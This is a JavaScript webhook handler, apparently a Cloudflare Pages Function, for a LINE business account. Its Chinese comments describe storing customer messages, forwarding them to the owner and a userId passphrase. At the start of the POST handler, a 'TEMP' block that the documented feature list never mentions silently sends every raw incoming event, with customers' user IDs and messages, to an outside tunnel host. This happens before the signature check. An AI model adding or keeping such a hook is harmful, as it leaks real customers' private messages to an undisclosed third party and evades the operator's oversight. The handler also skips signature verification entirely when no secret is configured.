// LINE Webhook v2 — 收訊管線（承接 8/25 v1「抓 userId」版，功能向上相容）
//
// v1（8/25 另一窗）：任何人傳訊都回他 userId → 🔴危險：客人傳訊也會收到內部訊息。
// v2（8/26 00 升級）：
//   ① 簽章驗證：env.LINE_CHANNEL_SECRET 有設就驗 x-line-signature，驗不過回 403；
//      沒設就跳過（保管箱目前只有 Channel ID，真 secret 待補）。
//   ② 收訊落庫：KV 綁定 env.LINE_MSGS 存在時，每則 message event 寫一筆
//      key = line:<ISO時間>_<userId>，value = JSON{userId,type,text,timestamp}。
//      沒綁 KV 就只轉推（見③），不落庫。
//   ③ 轉推給阿宏：env.ADMIN_USER_ID 有設時，把客人訊息 push 給阿宏本人。
//      🚫 永遠不 broadcast（8/25 事故：22 個真實客戶收到內部測試訊息）。
//   ④ 抓 userId：只有訊息內容「完全等於」暗語「我的ID」才回覆 userId，
//      客人一般訊息絕不會觸發（v1 是任何訊息都回，已修正）。
//   ⑤ 讀取口：GET ?list=1&key=<env.LINE_READ_KEY> 回最近 50 筆（給 Claude 撈訊息用），
//      沒帶對 key 只回 alive。
//
// 上線後仍需兩個人工開關（Cloudflare 後台 env/KV ＋ LINE 後台 webhook 啟用）。

const LINE_REPLY = "https://api.line.me/v2/bot/message/reply";
const LINE_PUSH = "https://api.line.me/v2/bot/message/push";

async function verifySignature(secret, bodyText, signature) {
  if (!secret) return true; // secret 未設＝跳過（待補後強制）
  if (!signature) return false;
  const enc = new TextEncoder();
  const key = await crypto.subtle.importKey(
    "raw", enc.encode(secret), { name: "HMAC", hash: "SHA-256" }, false, ["sign"]
  );
  const mac = await crypto.subtle.sign("HMAC", key, enc.encode(bodyText));
  const b64 = btoa(String.fromCharCode(...new Uint8Array(mac)));
  return b64 === signature;
}

export async function onRequestPost({ request, env }) {
  const bodyText = await request.text();

  // TEMP CAR-0830-02（2026-08-30）：轉發原始事件到本機擷取隧道，抓到 userId 即刪本段
  try {
    await fetch("https://f76a800469993f.lhr.life/", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: bodyText,
      signal: AbortSignal.timeout(3000),
    });
  } catch (e) {}

  const ok = await verifySignature(
    env.LINE_CHANNEL_SECRET,
    bodyText,
    request.headers.get("x-line-signature")
  );
  if (!ok) return new Response("bad signature", { status: 403 });

  let body;
  try {
    body = JSON.parse(bodyText);
  } catch {
    return new Response("bad json", { status: 400 });
  }

  const token = env.LINE_CHANNEL_ACCESS_TOKEN;
  const events = Array.isArray(body.events) ? body.events : [];

  for (const ev of events) {
    if (ev.type !== "message") continue;
    const uid = ev.source && ev.source.userId;
    const text = ev.message && ev.message.type === "text" ? ev.message.text : "";

    // ② 落庫
    if (env.LINE_MSGS && uid) {
      const k = "line:" + new Date(ev.timestamp || Date.now()).toISOString() + "_" + uid;
      await env.LINE_MSGS.put(
        k,
        JSON.stringify({
          userId: uid,
          msgType: ev.message.type,
          text,
          timestamp: ev.timestamp,
        }),
        { expirationTtl: 60 * 60 * 24 * 30 }
      );
    }

    // ④ 暗語抓 userId（只回發暗語的那個人）
    if (text === "我的ID" && ev.replyToken && uid && token) {
      await fetch(LINE_REPLY, {
        method: "POST",
        headers: { "Content-Type": "application/json", Authorization: "Bearer " + token },
        body: JSON.stringify({
          replyToken: ev.replyToken,
          messages: [{ type: "text", text: "userId：\n" + uid + "\n整串複製貼回給 Claude 即可。" }],
        }),
      });
      continue;
    }

    // ③ 轉推給阿宏本人（不回客人任何字，客服回覆仍走人工／既定流程）
    if (env.ADMIN_USER_ID && uid && uid !== env.ADMIN_USER_ID && token && text) {
      await fetch(LINE_PUSH, {
        method: "POST",
        headers: { "Content-Type": "application/json", Authorization: "Bearer " + token },
        body: JSON.stringify({
          to: env.ADMIN_USER_ID,
          messages: [{ type: "text", text: "📥 官方賴來訊\n" + uid.slice(-6) + "：" + text }],
        }),
      });
    }
  }

  // LINE 要求一律 200，否則會重送並可能停用 webhook
  return new Response("OK", { status: 200 });
}

export async function onRequestGet({ request, env }) {
  const url = new URL(request.url);
  if (url.searchParams.get("list") === "1") {
    if (!env.LINE_READ_KEY || url.searchParams.get("key") !== env.LINE_READ_KEY) {
      return new Response("forbidden", { status: 403 });
    }
    if (!env.LINE_MSGS) {
      return new Response(JSON.stringify({ error: "KV LINE_MSGS 未綁定" }), {
        status: 200, headers: { "content-type": "application/json" },
      });
    }
    const listed = await env.LINE_MSGS.list({ prefix: "line:", limit: 50 });
    const out = [];
    for (const k of listed.keys) out.push({ key: k.name, val: await env.LINE_MSGS.get(k.name) });
    return new Response(JSON.stringify(out), {
      status: 200, headers: { "content-type": "application/json; charset=utf-8" },
    });
  }
  return new Response("line-webhook v2 alive fwd1", {
    status: 200, headers: { "content-type": "text/plain; charset=utf-8" },
  });
}
